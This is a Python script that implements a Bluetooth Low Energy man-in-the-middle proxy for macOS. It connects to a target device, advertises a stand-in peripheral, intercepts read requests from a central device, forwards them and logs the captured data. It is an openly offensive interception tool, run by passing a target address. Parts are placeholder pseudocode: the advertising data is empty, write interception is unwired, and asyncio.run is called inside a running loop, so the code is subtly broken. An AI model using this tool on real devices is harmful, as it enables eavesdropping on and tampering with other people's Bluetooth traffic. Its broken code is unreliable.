import os
import json
import asyncio
import logging
from bleak import BleakClient
import objc
from Foundation import NSObject, NSLog
# Import CoreBluetooth classes via pyobjc
objc.loadBundle("CoreBluetooth", globals(), bundle_path="/System/Library/Frameworks/CoreBluetooth.framework")

class MITMPeripheralDelegate(NSObject):
    # This delegate intercepts BLE events from the central.
    def initWithMITMProxy_(self, proxy):
        self = objc.super(MITMPeripheralDelegate, self).init()
        if self is None:
            return None
        self.proxy = proxy
        return self

    # Example method: called when a read request is received from the central.
    def peripheralManager_didReceiveReadRequest_(self, peripheralManager, request):
        logging.info("Intercepted Read Request on Characteristic: %s", request.characteristic.UUID())
        # Forward the read to the actual target device via proxy method.
        data = self.proxy.forward_read(request.characteristic.UUID().UUIDString())
        request.value = data
        peripheralManager.respondToRequest_withResult_(request, 0)  # 0 for success

    # Additional delegate methods can be defined here.

class MacMITMProxy:
    def __init__(self, target_address):
        self.target_address = target_address
        self.client = BleakClient(self.target_address)
        self.target_services = None
        # Setup logging
        logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
        # Peripheral Manager setup (pseudocode)
        self.peripheral_manager = self.setup_peripheral_manager()

    async def connect_to_target(self):
        try:
            await self.client.connect()
        except Exception as e:
            logging.error("Failed to connect to target (%s): %s", self.target_address, e)
            return False
        self.target_services = await self.client.get_services()
        logging.info("Connected to target: %s", self.target_address)
        logging.info("Discovered Services: %s", self.target_services)
        return True

    def setup_peripheral_manager(self):
        # Using pyobjc to create a CBPeripheralManager instance
        from CoreBluetooth import CBPeripheralManager
        manager = CBPeripheralManager.alloc().initWithDelegate_queue_options_(None, None, None)
        # Instantiate our custom delegate with a new name.
        delegate = MITMPeripheralDelegate.alloc().initWithMITMProxy_(self)
        manager.setDelegate_(delegate)
        # Setup advertising with target_services information (pseudocode)
        advertising_data = {
            # Fill in with appropriate keys like CBAdvertisementDataServiceUUIDsKey, etc.
        }
        manager.startAdvertising_(advertising_data)
        logging.info("Started peripheral advertising as proxy for target.")
        return manager

    def forward_read(self, char_uuid):
        # Forward a read request from the central to the target peripheral.
        try:
            # Find the corresponding characteristic in the target services.
            for service in self.target_services:
                for char in service.characteristics:
                    if char.uuid == char_uuid:
                        data = asyncio.run(self.client.read_gatt_char(char_uuid))
                        logging.info("Forwarded read from target: %s", data)
                        return data
        except Exception as e:
            logging.error("Error forwarding read: %s", e)
        return b""

    async def forward_write(self, char_uuid, data):
        # Forward a write request to the target peripheral.
        try:
            await self.client.write_gatt_char(char_uuid, data)
            logging.info("Forwarded write to target on %s: %s", char_uuid, data)
        except Exception as e:
            logging.error("Error forwarding write: %s", e)

    def analyze_target_services(self):
        """After connection, check discovered services against known profiles."""
        logging.info("Analyzing target services using Bluetooth SIG data...")
        profiles_dir = os.path.join(os.getcwd(), "bluetooth-sig-public-jsons", "profiles_and_services")
        if not os.path.isdir(profiles_dir):
            logging.warning("Profiles and services directory not found at %s.", profiles_dir)
            return
        for service in self.target_services:
            service_uuid = service.uuid.lower()
            found_profile = None
            # Scan through available profile JSON files
            for filename in os.listdir(profiles_dir):
                if filename.endswith(".json"):
                    profile_path = os.path.join(profiles_dir, filename)
                    try:
                        with open(profile_path, "r") as f:
                            data = json.load(f)
                        profile_uuid = data.get("uuid", "").lower()
                        if profile_uuid == service_uuid:
                            found_profile = data
                            break
                    except Exception as e:
                        logging.error("Error loading profile %s: %s", filename, e)
            if found_profile:
                logging.info("Service %s matches profile: %s", service_uuid, found_profile.get("name"))
                recs = found_profile.get("recommended_commands", [])
                if recs:
                    logging.info("Recommended commands: %s", recs)
                    # (Optional) Here you might prompt the user to execute one of these commands.
            else:
                logging.info("No matching profile found for service %s", service_uuid)

    async def run(self):
        connected = await self.connect_to_target()
        if not connected:
            logging.error("Target device not found; please verify the address and ensure the device is available.")
            return
        # Analyze discovered services against known profiles
        self.analyze_target_services()
        logging.info("MITM Proxy running. Press Ctrl+C to exit.")
        try:
            while True:
                await asyncio.sleep(1)
        except (KeyboardInterrupt, asyncio.CancelledError):
            logging.info("Shutdown signal detected. Shutting down MITM Proxy gracefully.")
        finally:
            if self.client.is_connected:
                await self.client.disconnect()
                logging.info("Disconnected from target.")
            # Here you can also stop any advertising if necessary.

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 mac_mitm.py <target_device_address>")
        sys.exit(1)
    target_address = sys.argv[1]
    mitm_proxy = MacMITMProxy(target_address)
    asyncio.run(mitm_proxy.run())